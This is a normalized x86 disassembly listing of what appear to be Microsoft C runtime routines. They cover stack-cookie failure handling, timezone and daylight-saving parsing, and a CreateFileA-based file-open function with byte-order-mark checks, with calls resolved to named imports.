call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] bl
mov eax [ eax + 0xac ]
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_41a10f
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_4199ad
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_4199ad
pop ecx
sub_41a220
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_41a24b
push 0x2c
push r--data
call sub_412340
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_411ef3
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_41aa6b
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_41aa25
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_41a9bd
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
lea eax [ ebp - 0x28 ]
push eax
call sub_41a9f1
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
call sub_41dfa2
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_41e316
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_40fdab
pop ecx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
push esi
call sub_415b90
inc eax
push eax
call sub_413757
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_41e020
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_412385
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_4198b4
add esp 0x10
test eax eax
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
push esi
push esi
call sub_415b90
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_415600
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov edi [ ebp - 0x1c ]
call sub_41aa65
mov [ eax ] edi
mov edi [ ebp - 0x24 ]
call sub_41aa59
mov [ eax ] edi
mov edi [ ebp - 0x28 ]
call sub_41aa5f
mov [ eax ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a4fa
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
jmp r-xdata
push eax
call sub_40fdab
pop ecx
push esi
call sub_41e305
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_41e305
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_4198b4
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_41aa65
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
jmp r-xdata
inc esi
inc esi
push esi
call sub_41e305
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_41a58a
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
mov eax edi
jne r-xdata
and eax 0x80000003
jns r-xdata
and eax 0x80000003
jns r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
mov [ ebp - 0xc ] eax
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov esi [ esi * 4 + rw-data ]
mov esi [ esi * 4 + rw-data ]
jmp r-xdata
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ rw-data ] esi
mov [ rw-data ] ecx
call sub_41a9f1
test eax eax
pop ecx
je r-xdata
mov [ rw-data ] esi
mov [ rw-data ] ecx
mov [ rw-data ] edi
jmp r-xdata
add esi [ ebp + 0x1c ]
add esi eax
lea esi [ esi + eax - 0x7 ]
jmp r-xdata
mov [ ebp + 0xc ] eax
lea eax [ edi + 0x12b ]
cdq
lea ebx [ edi - 0x1 ]
mov edi 0x190
idiv edi
push 0x64
pop edi
inc esi
push 0x7
mov [ ebp - 0x8 ] eax
mov eax ebx
cdq
idiv edi
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x10 ]
sub edx eax
mov ebx edx
lea eax [ edi - 0x1 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov edx edi
imul edx edx 0x16d
add eax esi
add eax ebx
lea eax [ edx + eax - 0x63db ]
cdq
pop ebx
idiv ebx
mov eax [ ebp + 0x14 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x18 ]
cmp edx [ ebp + 0x18 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x3e8
add [ rw-data ] eax
jns r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_411f2e
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
imul ecx ecx 0x3c
add ecx [ ebp + 0x20 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x24 ]
imul ecx ecx 0x3e8
add ecx [ ebp + 0x28 ]
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x5
jne r-xdata
mov eax 0x5265c00
cmp [ rw-data ] eax
jl r-xdata
add [ rw-data ] 0x5265c00
dec [ rw-data ]
jmp r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov [ rw-data ] edi
sub [ rw-data ] eax
inc [ rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
jmp r-xdata
sub esi 0x7
jmp r-xdata
cmp esi eax
jle r-xdata
sub_41a77f
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
call sub_41a9bd
test eax eax
pop ecx
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
mov edx [ edi + 0x14 ]
push ebx
xor ebx ebx
inc ebx
cmp edx [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp edx [ rw-data ]
je r-xdata
pop esi
leave
retn
push esi
push esi
push esi
push esi
push esi
push ebx
push edx
push ebx
push ebx
push 0x2
pop ecx
push 0x4
pop eax
call sub_41a58a
push esi
push esi
push esi
push esi
push esi
push 0x5
push [ edi + 0x14 ]
push ebx
push esi
push 0x2
pop ecx
push 0xa
pop eax
call sub_41a58a
add esp 0x48
cmp [ rw-data ] si
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
cmp ecx eax
mov edx [ edi + 0x1c ]
jge r-xdata
cmp edx eax
jl r-xdata
cmp edx ecx
jl r-xdata
movzx eax [ rw-data ]
push eax
push esi
push esi
push edx
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push edx
push ebx
jmp r-xdata
mov eax ebx
cmp edx ecx
jg r-xdata
xor eax eax
jmp r-xdata
cmp edx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push esi
push esi
push [ edi + 0x14 ]
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push [ edi + 0x14 ]
push ebx
jmp r-xdata
movzx eax [ rw-data ]
push ebx
call sub_41a58a
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
add esp 0x24
cmp [ rw-data ] si
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp edx eax
jle r-xdata
pop ebx
cmp edx ecx
jle r-xdata
movzx eax [ rw-data ]
push esi
call sub_41a58a
add esp 0x24
jmp r-xdata
mov eax [ edi + 0x8 ]
imul eax eax 0x3c
add eax [ edi + 0x4 ]
imul eax eax 0x3c
add eax [ edi ]
imul eax eax 0x3e8
cmp edx ecx
jne r-xdata
cmp edx ecx
jge r-xdata
cmp edx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
xor ecx ecx
cmp eax [ rw-data ]
setge cl
jmp r-xdata
mov eax ecx
jmp r-xdata
sub_41a92d
push 0x8
push r--data
call sub_412340
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_412385
retn
push 0x6
call sub_411ef3
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a973
call sub_41a24b
inc [ rw-data ]
sub_41a97c
push 0xc
push r--data
call sub_412340
push 0x6
call sub_411ef3
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
call sub_41a77f
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a9b4
mov eax [ ebp - 0x1c ]
call sub_412385
retn
sub_41a9bd
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
push 0x16
pop eax
pop esi
retn
sub_41a9f1
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
push 0x16
pop eax
pop esi
retn
sub_41aa25
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
push 0x16
pop eax
pop esi
retn
sub_41aa71
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push edi
push 0x10
mov esi eax
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x28 ] 0xc
mov [ ebp - 0x24 ] ebx
pop edi
je r-xdata
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_40e109
test eax eax
pop ecx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
lea eax [ ebp - 0x14 ]
push eax
call sub_4114ce
test eax eax
pop ecx
je r-xdata
mov eax 0x8000
test [ ebp + 0x10 ] eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
mov eax [ ebp + 0x10 ]
push 0x3
pop edx
and eax edx
sub eax ebx
mov ecx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] ecx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x14 ] eax
je r-xdata
mov [ ebp - 0x8 ] ebx
sub eax edi
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax edi
je r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
call sub_41209c
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_412089
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_41202a
add esp 0x14
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
jg r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
sub eax edi
je r-xdata
mov eax esi
jmp r-xdata
test cl 0x40
je r-xdata
mov edx [ rw-data ]
not edx
and edx [ ebp + 0x18 ]
test dl dl
js r-xdata
mov [ ebp - 0x10 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x100
test eax ecx
mov edi 0x80
je r-xdata
cmp eax 0x100
je r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test cx 0x1000
je r-xdata
or [ ebp - 0xc ] 0x10000
or edi 0x4000000
cmp [ ebp - 0x18 ] 0x2
jne r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
xor eax eax
cmp [ ebp - 0xc ] ecx
sete al
mov [ ebp - 0x8 ] eax
jmp r-xdata
test cl 0x20
je r-xdata
or edi eax
or [ ebp - 0x8 ] 0x4
cmp eax 0x300
jne r-xdata
test cl 0x10
je r-xdata
or edi 0x8000000
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
call sub_414bf8
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
or edi 0x10000000
mov eax [ ebp + 0x8 ]
push ebx
push edi
push [ ebp - 0x10 ]
mov [ eax ] 0x1
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_41209c
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_412089
mov [ eax ] 0x18
jmp r-xdata
push edi
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call sub_412089
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
push edi
call [ CloseHandle@IAT ]
jmp r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4120af
push edi
push [ esi ]
call sub_4149c7
mov eax [ esi ]
mov edx eax
and eax 0x1f
imul eax eax 0x28
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
imul eax eax 0x28
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] bl
mov [ eax ] cl
jne r-xdata
mov ecx 0x74000
test [ ebp + 0x10 ] ecx
mov edi 0x4000
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax ecx
cmp eax edi
je r-xdata
mov eax [ ebp - 0x14 ]
and eax ecx
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_415064
add esp 0xc
cmp eax edi
mov [ ebp - 0x8 ] eax
jne r-xdata
mov esi [ esi ]
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + esi + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] edi
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] bl
call sub_413c2c
add esp 0xc
test eax eax
jne r-xdata
call sub_41209c
cmp [ eax ] 0x83
je r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x8 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_415064
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_4151f6
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x8 ]
cdq
push edx
push eax
push [ esi ]
call sub_40f169
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x8 ]
push eax
push [ esi ]
call sub_413c2c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x8 ] 0xbfbbef
mov [ ebp - 0x10 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_415383
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x8 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x10 ] edi
jg r-xdata
mov [ ebp - 0x8 ] 0xfeff
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_415383
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_4151f6
pop ecx
call sub_412089
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_415064
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x8 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x10 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x8 ]
push eax
push [ esi ]
call sub_4148eb
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_415064
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_415383
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_415383
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_41b0af
push 0x14
push r--data
call sub_412340
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_412089
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_41202a
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_412385
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_41aa71
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b14d
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_41b14d
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_414bd6
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
imul eax eax 0x28
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_41b199
push ebp
mov ebp esp
sub esp 0x14
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_410556
mov edx [ ebp + 0x8 ]
xor esi esi
cmp edx esi
jne r-xdata
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx esi
jne r-xdata
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] esi
jne r-xdata
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi 0x200
lea eax [ ebp - 0x14 ]
push eax
push ebx
push edx
call sub_410d94
add esp 0xc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
leave
retn
movzx edx cx
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ edx ] 0x0
jne r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
movzx esi dx
movzx cx [ ecx + 0x11d ]
movzx esi cx
jmp r-xdata
push 0x1
push [ eax + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x2
push ecx
push 0x2
dec edx
push edx
push edi
push [ eax + 0xc ]
lea eax [ ebp - 0x14 ]
push eax
call sub_418df5
add esp 0x24
cmp eax 0x1
jne r-xdata
xor esi esi
jmp r-xdata
movzx edx cx
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
movzx cx [ ebx ]
movzx ecx cx
movzx edx cl
inc ebx
test [ edx + eax + 0x1d ] 0x4
je r-xdata
cmp eax 0x2
jne r-xdata
movzx ax [ ebp - 0x4 ]
jmp r-xdata
movzx ecx dx
